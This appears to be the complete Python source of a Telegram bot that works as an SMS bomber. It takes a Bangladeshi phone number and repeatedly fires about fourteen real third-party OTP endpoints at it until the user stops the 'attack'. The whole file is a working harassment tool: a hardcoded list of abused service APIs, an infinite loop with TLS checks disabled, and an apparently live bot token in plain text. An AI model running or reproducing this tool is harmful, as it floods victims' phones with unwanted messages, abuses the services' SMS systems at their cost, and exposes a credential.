#!/usr/bin/env python3

from concurrent.futures import ThreadPoolExecutor
import logging
import time
import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib3
import requests
import telebot
from telebot import types

# Insecure Request warnings বন্ধ করার জন্য
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------- Render পোর্টের জন্য ডামি HTTP সার্ভার ----------
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Bot is alive")

    def log_message(self, format, *args):
        pass  # Render-এর লগ পরিষ্কার রাখতে

def start_health_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), HealthHandler)
    logging.info(f"Health server listening on port {port}")
    server.serve_forever()

threading.Thread(target=start_health_server, daemon=True).start()
# ----------------------------------------------------------

# ... আপনার বাকি কোড (bot = telebot.TeleBot(...), হ্যান্ডলার ইত্যাদি) ...
# Configure logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# --- [ CONFIGURATION ] ---
BOT_TOKEN = "8730292350:AAGqEEbDqE9yYs2fGU7GTouc4ct70TvrZX0"
DEVELOPER_ID = "@ChannnelAi"

# Thread Pool Management (একসাথে সর্বোচ্চ ২০টি ব্যাকগ্রাউন্ড টাস্ক চলবে)
executor = ThreadPoolExecutor(max_workers=20)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

stop_signals = {}
user_attacks = {}
attack_stats = {}

# --- [ ULTIMATE API COLLECTION ] ---
ULTIMATE_APIS = [
    {
        "name": "API-6",
        "type": "SMS",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}',
    },
    {
        "name": "API-7",
        "type": "SMS",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}',
    },
    {
        "name": "API-8",
        "type": "SMS",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}',
    },
    {
        "name": "API-9",
        "type": "SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}',
    },
    {
        "name": "API-10",
        "type": "SMS",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "API-11",
        "type": "SMS",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}',
    },
    {
        "name": "API-15",
        "type": "SMS",
        "url": lambda phone: f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}",
        "method": "GET",
        "headers": {},
        "data": None,
    },
    {
        "name": "API-16",
        "type": "SMS",
        "url": lambda phone: f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0",
        "method": "GET",
        "headers": {},
        "data": None,
    },
    {
        "name": "API-18",
        "type": "SMS",
        "url": lambda phone: f"https://api.medeasy.health/api/send-otp/+88{phone}/",
        "method": "GET",
        "headers": {},
        "data": None,
    },
    {
        "name": "API-23",
        "type": "SMS",
        "url": "https://app.deshal.net/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "API-28",
        "type": "SMS",
        "url": "https://api.osudpotro.com/api/v1/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+880{phone}","deviceToken":"web","language":"en","os":"web"}}',
    },
    {
        "name": "API-31",
        "type": "SMS",
        "url": "https://fundesh.com.bd/api/auth/generateOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}',
    },
    {
        "name": "API-33",
        "type": "SMS",
        "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+88{phone}"}}',
    },
    {
        "name": "API-50",
        "type": "SMS",
        "url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile={phone}&fcmToken=&referral=",
    },
]


def send_single_api(api, phone):
    """Safe HTTP Request using pure requests library"""
    try:
        url = api["url"](phone) if callable(api["url"]) else api["url"]
        data = api["data"](phone) if callable(api["data"]) else None

        if api["method"] == "POST":
            res = requests.post(
                url, data=data, headers=api["headers"], timeout=3, verify=False
            )
        else:
            res = requests.get(url, headers=api["headers"], timeout=3, verify=False)

        if res.status_code in [200, 201, 202, 204]:
            return True
    except Exception:
        pass
    return False


def run_attack_cycle(phone, stats):
    """Fire all APIs in sequence inside background thread"""
    for api in ULTIMATE_APIS:
        if send_single_api(api, phone):
            api_type = api.get("type", "SMS")
            stats[api_type] = stats.get(api_type, 0) + 1


def create_main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🚀 Start Infinite", "📊 Check Stats")
    markup.row("ℹ️ Help", "👨‍💻 Developer")
    return markup


def create_stop_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🛑 STOP ATTACK")
    markup.row("🏠 Main Menu")
    return markup


@bot.message_handler(commands=["start"])
def start_command(message):
    welcome_text = f"""
▓▒░ <b>ARAFAT BOT</b> ░▒▓
───────────── v3.0 ─────────────

┌─── <b>[ ⚙️ SYSTEM INFO ]</b>
├ 👤 <b>Developer :</b> <code>{DEVELOPER_ID}</code>
├ ⚡ <b>Active APIs :</b> <code>{len(ULTIMATE_APIS)} Endpoints</code>
└ 📡 <b>Services :</b> <i>Calls & SMS (Pure Multi-threaded)</i>

┌─── <b>[ 📌 HOW TO USE ]</b>
├ 📱 Send <code>11-digit</code> BD Phone Number
└ 🎛️ Control process using menu buttons
"""
    bot.send_message(
        message.chat.id, welcome_text, reply_markup=create_main_keyboard()
    )


@bot.message_handler(
    func=lambda message: message.text in ["ℹ️ Help", "/help"]
)
def help_command(message):
    bot.send_message(
        message.chat.id,
        "<b>[ 📱 HOW TO OPERATE ]</b>\n1. Send 11-digit BD number.\n2. Press STOP button anytime to cancel.",
    )


@bot.message_handler(func=lambda message: message.text == "👨‍💻 Developer")
def developer_info(message):
    bot.send_message(
        message.chat.id,
        f"Developer: {DEVELOPER_ID}\nEngine: Pure Multi-Threaded Engine (Non-Async)",
    )


@bot.message_handler(func=lambda message: message.text == "📊 Check Stats")
def check_stats(message):
    user_id = message.from_user.id
    stats = attack_stats.get(user_id, {})
    total = stats.get("SMS", 0)
    bot.send_message(
        message.chat.id,
        f"📊 <b>Total Hits Sent:</b> <code>{total}</code>",
        reply_markup=create_main_keyboard(),
    )


@bot.message_handler(func=lambda message: message.text == "🚀 Start Infinite")
def start_attack_prompt(message):
    bot.send_message(
        message.chat.id, "📱 Input 11-digit Bangladeshi Number (e.g. 019XXXXXXXX)"
    )


@bot.message_handler(func=lambda message: message.text == "🛑 STOP ATTACK")
def stop_attack(message):
    user_id = message.from_user.id
    if user_id in stop_signals:
        stop_signals[user_id] = True
        bot.send_message(
            message.chat.id,
            "🛑 <b>Attack Stopping...</b>",
            reply_markup=create_main_keyboard(),
        )
    else:
        bot.send_message(
            message.chat.id,
            "ℹ️ No active attack found.",
            reply_markup=create_main_keyboard(),
        )


@bot.message_handler(func=lambda message: message.text == "🏠 Main Menu")
def main_menu(message):
    bot.send_message(
        message.chat.id, "🏠 Main Menu", reply_markup=create_main_keyboard()
    )


def bg_attack_task(user_id, phone, chat_id, message_id):
    """Background Multi-threaded Task"""
    stats = attack_stats[user_id]
    cycle_count = 0

    while not stop_signals.get(user_id, False):
        try:
            cycle_count += 1
            stats["cycles"] = cycle_count

            # Fire all APIs safely
            run_attack_cycle(phone, stats)

            total = stats.get("SMS", 0)

            status_text = f"""
▓▒░ <b>ACTIVE ATTACK - CYCLE {cycle_count}</b> ░▒▓
────────────────────────────────
📱 <b>Target :</b> <code>{phone}</code>
📩 <b>SMS OTPs Sent :</b> <code>{total}</code>
⏱️ <b>Status :</b> <code>Running...</code>
"""
            try:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=status_text,
                    reply_markup=create_stop_keyboard(),
                )
            except Exception:
                pass  # Telegram rate limit ignore

            if stop_signals.get(user_id, False):
                break

            time.sleep(2)  # Delay between cycles

        except Exception as e:
            logger.error(f"Error in BG Process: {e}")
            time.sleep(2)

    # Cleanup
    stop_signals.pop(user_id, None)
    user_attacks.pop(user_id, None)

    try:
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"✅ <b>Attack Stopped for {phone}!</b>",
            reply_markup=create_main_keyboard(),
        )
    except Exception:
        pass


@bot.message_handler(
    regexp=r"^(\+?88)?01[3-9]\d{8}$"
)  # Phone Number Matching
def handle_phone_number(message):
    user_id = message.from_user.id
    phone = message.text.strip()

    if phone.startswith("+88"):
        phone = phone[3:]
    elif phone.startswith("88"):
        phone = phone[2:]

    stop_signals[user_id] = False
    user_attacks[user_id] = {"phone": phone, "start_time": time.time()}
    attack_stats[user_id] = {"SMS": 0, "cycles": 0}

    msg = bot.send_message(
        message.chat.id,
        f"🚀 <b>Starting attack on {phone}...</b>",
        reply_markup=create_stop_keyboard(),
    )

    # Submit task to ThreadPoolExecutor
    executor.submit(bg_attack_task, user_id, phone, message.chat.id, msg.message_id)


if __name__ == "__main__":
    print("🤖 Bot started successfully! Press Ctrl+C to stop.")
    while True:
        try:
            # infinity_polling অটোমেটিক নেটওয়ার্ক ড্রপ বা এরর হ্যান্ডেল করে রি-কানেক্ট করে
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except Exception as e:
            logger.error(f"Polling Crash Prevented: {e}")
            time.sleep(3)
